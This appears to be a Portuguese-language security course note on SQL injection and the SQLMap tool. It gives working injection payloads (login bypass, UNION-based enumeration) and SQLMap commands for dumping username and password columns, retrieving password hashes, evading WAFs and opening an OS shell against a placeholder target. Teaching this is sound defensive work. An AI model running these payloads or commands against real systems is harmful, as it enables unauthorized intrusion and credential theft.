
<div align="center">
  <img src="https://cdn.cyberpunk.rs/wp-content/uploads/2018/08/sqlmap_bg2.jpg" alt="Ffuf" width="600"/>
</div>


➡️ [Fonte principal](https://portswigger.net/web-security/sql-injection#subverting-application-logic)  
➡️ [PDF da Aula](./pdf/sql_injection.pdf) desenvolvido por [@GJSegatto](https://github.com/GJSegatto)

# SQLinjection e SQLMap

## 1. Fundamentos de SQL Injection (SQLi)

A Injeção SQL é uma vulnerabilidade de aplicação web crítica que ocorre quando entradas fornecidas por usuários não são devidamente sanitizadas. Isso permite que a aplicação concatene dados arbitrários diretamente em consultas de banco de dados, falhando em distinguir entre os dados inseridos e sintaxe de comandos.

Quando o encapsulamento de uma _string_ é quebrado por caracteres especiais, o banco de dados executa a instrução modificada com os privilégios da aplicação.

### 1.1. Bypass de Autenticação

Em um cenário clássico de formulário de login, a consulta original no código fonte geralmente possui a seguinte estrutura:

SQL

```
SELECT * FROM users WHERE username = '$_POST["username"]' AND password = '$_POST["password"]'
```

Caso uma entrada maliciosa como `admin' --` seja inserida no campo de usuário, a instrução resultante enviada ao banco de dados torna-se:

SQL

```
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

O caractere `--`  atua como um delimitador de comentário na linguagem SQL. Consequentemente, a verificação da senha é completamente ignorada e anulada, retornando o acesso como o usuário administrador, independentemente da senha informada.

### 1.2. Categorias de Injeção SQL

A exploração é dividida primariamente pelo método de retorno das informações do banco de dados para o atacante:

- **SQLi In-Band:** O ataque e o retorno dos dados ocorrem no mesmo canal de comunicação.
    
    - Baseada em Erro: Força o banco de dados a gerar mensagens de erro explícitas que revelam informações sobre a estrutura interna.
        
    - Baseada em UNION: Utiliza o operador `UNION SELECT` para anexar os resultados de uma consulta forjada aos resultados da consulta legítima.
        
- **SQLi Blind:** A aplicação não exibe erros ou resultados na tela. A extração de dados exige a inferência observando o comportamento da aplicação.
    
    - Baseada em Booleano: Consiste em realizar perguntas de "Verdadeiro ou Falso" (ex: `AND 1=1` vs `AND 1=2`) e observar se o conteúdo da página ou o tamanho da resposta sofre alterações.
        
    - Baseada em Tempo: Utiliza funções de banco de dados para pausar a resposta caso uma condição seja verdadeira.
        
- **SQLi Out-of-Band (OOB):** Os dados são exfiltrados por um canal externo, como requisições DNS ou HTTP disparadas pelo próprio servidor de banco de dados para uma máquina controlada pelo atacante.
    
### 1.3. Impactos e Casos de Uso

- Bypass de Autenticação: Acesso não autorizado a painéis administrativos.
    
- Extração de Dados: Roubo de informações sensíveis e credenciais em texto claro ou hashes.
    
- Fingerprinting: Identificação do tipo e versão do SGBD para modelagem de ameaças.
    
- Execução de Código: Execução direta de comandos ou uploads de webshells no sistema operacional hospedeiro.

>[!Caution]
> Nenhuma técnica de prevenção única é infalível. Para a defesa, a implementação mais eficaz é o uso de Consultas Parametrizadas, onde o banco trata a entrada estritamente como dados, nunca como código executável. Além disso, a exploração ativa com ferramentas automatizadas só deve ser feita em ambientes autorizados.
    
## 2. Identificação e Exploração Manual

A exploração manual é essencial para validar a vulnerabilidade e entender o comportamento da aplicação antes de utilizar a automação.

### 2.1. Detecção Básica

A busca por pontos de injeção envolve testar todos os vetores de entrada (parâmetros GET/POST, Cookies, cabeçalhos HTTP):

1. Inserção de aspas: Adicionar `'` ou `"` e observar se a aplicação retorna um erro `HTTP 500` ou _stack trace_ do banco de dados.
    
2. Operações lógicas: Inserir `OR 1=1` para verificar se ocorre a exibição de dados adicionais não previstos.
    
3. Atrasos de tempo:Injetar comandos de _sleep_ para analisar diferenças no tempo de carregamento.
    
### 2.2. A Exploração Baseada em UNION

A técnica `UNION` requer que a consulta injetada tenha exatamente o mesmo número de colunas e tipos de dados compatíveis com a consulta original. O processo de descoberta segue:

**Descobrir a quantidade de colunas**

Injeta-se a cláusula `ORDER BY`, incrementando o índice numérico até o banco de dados retornar um erro de ausência de coluna.

- `?id=1 ORDER BY 1--` (Sucesso)
    
- `?id=1 ORDER BY 2--` (Sucesso)
    
- `?id=1 ORDER BY 3--` (Erro: Coluna 3 desconhecida).
    
**Identificar a coluna**

Preenchem-se as colunas identificadas para verificar qual delas reflete texto na tela da aplicação.

- `?id=1 UNION SELECT 'A', 'B'--`
    
**Mapeamento do Banco**

Com a coluna vulnerável identificada, extrai-se a estrutura interna do banco.

- `?id=1 UNION SELECT null, database()--` -> Extrai o nome do banco atual.
    
- `?id=1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()--` ->Lista todas as tabelas do banco em questão


>[!Important]
> Após a identificação manual, usamos ferramentas profissionais como o Burp Suite para interceptar requisições ou o SQLMap para automatizar a extração dos dados.
    
## 3. SQLMap

O SQLMap é uma ferramenta automatizada de framework aberto que detecta e explora injeções SQL através de força bruta inteligente e inferência avançada.

### 3.1. Vantagens e Desvantagens da Automação

| ** Vantagens**                                                                                            | **Desvantagens**                                                                                                    |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| Identifica e explora quase todos os principais SGBDs nativamente (MySQL, PostgreSQL, Oracle, MSSQL, etc). | Ferramentas automatizadas geram grandes volumes de tráfego, sendo facilmente detectadas por SOCs                    |
| Realiza a exfiltração de dados caractere por caractere, o que seria inviável manualmente.                 | Requisições padronizadas com assinaturas conhecidas são rapidamente mitigadas por WAFs (Web Application Firewalls). |
| Permite testes simultâneos em parâmetros de URL, formulários POST, _Cookies_ e cabeçalhos HTTP.           | Pode falhar em rotas de aplicação não padronizadas, exigindo sintonia fina das _flags_ de configuração.             |

### 3.2. Casos de Uso

O fluxo básico de trabalho da ferramenta respeita a hierarquia do SGBD: Enumeração de Bancos -> Tabelas -> Colunas -> _Dump_ de Dados.

**1. Enumeração Básica -> Método GET**

Verifica os bancos de dados disponíveis a partir de um parâmetro de URL.

Bash

```
sqlmap -u "http://alvo.com/pagina.php?id=1" --dbs --batch
```

_O parâmetro `--batch` automatiza as escolhas de fluxo da ferramenta, utilizando o comportamento padrão sem exigir interação do operador._

**2. Ataque em Formulários de Login -> Método POST**

Realiza o _parsing_ da página web, localizando tags HTML `<form>` e injetando vetores diretamente nos campos de entrada ocultos.

Bash

```
sqlmap -u "http://alvo.com/login.php" --forms --crawl=1
```

_A configuração `--crawl=1` instrui a de rede interna a buscar alvos adjacentes na mesma página de origem._

**3. Injeções Complexas via Arquivo Raw -> Requisição HTTP Bruta**

Para alvos onde a injeção ocorre em cabeçalhos (_User-Agent_ ou _Cookies_) ou em requisições contendo JSON, é possível salvar a requisição interceptada, via Burp Suite, em um arquivo de texto.

Bash

```
sqlmap -r requisicao_interceptada.txt -p "id_usuario"
```

_O argumento `-p` força o foco da ferramenta em um único parâmetro, economizando tempo de processamento._

**4. Extração de Dados -> Dump**

Após mapear a arquitetura, executa-se o _download_ dos dados específicos, visando informações críticas.

Bash

```
sqlmap -u "http://alvo.com/pagina.php?id=1" -D corporativo -T usuarios -C username,password --dump --start=1 --stop=10
```

_Os controles `--start` e `--stop` limitam a extração a um intervalo de linhas, evitando sobrecarga ou demora excessiva em tabelas gigantescas._

**5. Evasão de WAF e Ajuste de Agressividade**

Quando as requisições padrão são bloqueadas, faz-se necessário ofuscar os comandos e aumentar a intensidade das varreduras.

Bash

```
sqlmap -u "http://alvo.com/busca.php?q=teste" --tamper=space2comment --random-agent --level=3 --risk=2
```

**6. Modo Wizard**

Para operadores iniciantes, a ferramenta disponibiliza uma interface assistida que formula as consultas através de um questionário em linha de comando.

Bash

```
sqlmap --wizard
```

## 4. Principais Flags do SQLMap

Abaixo, encontra-se o detalhamento das _flags_ essenciais para operação:

### Alvo e Requisição

- **`-u [URL]`** ou **`--url=[URL]`**: Especifica a URL a ser analisada.
    
- **`-p [parâmetro]`**: Restringe o escopo de teste unicamente ao parâmetro definido.
    
- **`--data="user=a&pass=b"`**: Converte automaticamente a requisição para o método `POST`, injetando os dados no corpo do tráfego.
    
- **`-r [arquivo.txt]`**: Define como alvo uma requisição HTTP integral a partir de um arquivo local.
    

### Enumeração e Extração

- **`--dbs`**: Lista todos os bancos de dados disponíveis.
    
- **`--tables`**: Enumera as tabelas de um banco de dados, requer a declaração do banco alvo com `-D`.
    
- **`--columns`**: Enumera as colunas de uma tabela, requer a declaração da tabela com `-T`.
    
- **`--dump`**: Inicia o processo de download e salvamento das informações requeridas.
    
- **`--passwords`**: Enumera os usuários do banco de dados, recupera as _hashes_ de suas respectivas senhas e disponibiliza a opção de tentativa de _cracking_ local.
    

### Evasão de Defesas (Avançado)

- **`--level=[1-5]`**: Ajusta a profundidade e abrangência dos testes (Padrão: 1). 
	- Níveis a partir do 2 englobam testes no cabeçalho _Cookie_; níveis superiores cobrem _User-Agent_ e _Referer_.
    
- **`--risk=[1-3]`**: Configura o perigo potencial dos _payloads_ (Padrão: 1). 
	- Risco 2 adiciona comandos pesados baseados em tempo; 
	- Risco 3 insere vetores baseados no operador `OR`.
    
- **`--tamper=[script]`**: Invoca rotinas de ofuscação para alterar a estrutura do _payload_ original, evadindo assinaturas de WAFs
    
- **`--random-agent`**: Utiliza cabeçalhos _User-Agent_ verossímeis em rotação, ocultando a identificação padrão do SQLMap.
    
- **`--technique=[BEUST]`**: Limita a exploração a uma ou mais técnicas específicas 
	- B = Boolean; E = Error; U = Union; S = Stacked; T = Time
    
- **`--os-shell`**: Usuário possui privilégios máximos e o SGBD dispõe de suporte a acesso de arquivos, permite a instauração de um terminal interativo com o sistema operacional do servidor.

### Mais algumas flags

- **`--current-db:`** Exibe qual banco de dados a aplicação está usando no momento.

- **`--current-user:`** Mostra o usuário do banco de dados executando a query.

- **`--is-dba:`** Verifica se o usuário atual tem privilégios máximos.

- **`-D [banco] --tables:`** Lista as tabelas de um banco de dados específico.

- **`-D [banco] -T [tabela] --columns:`** Lista as colunas de uma tabela específica.

- **`-D [banco] -T [tabela] -C [col1,col2] --dump:`** Extrai os dados reais daquelas colunas.

- **`--dump-all:`** Extrai absolutamente tudo.

- **`--count:`** Exibe apenas a quantidade de linhas em uma tabela, sem baixar os dados. Útil para saber o tamanho do estrago.

- **`--start=1 --stop=10:`** Combinado com o --dump, extrai apenas um intervalo de linhas.
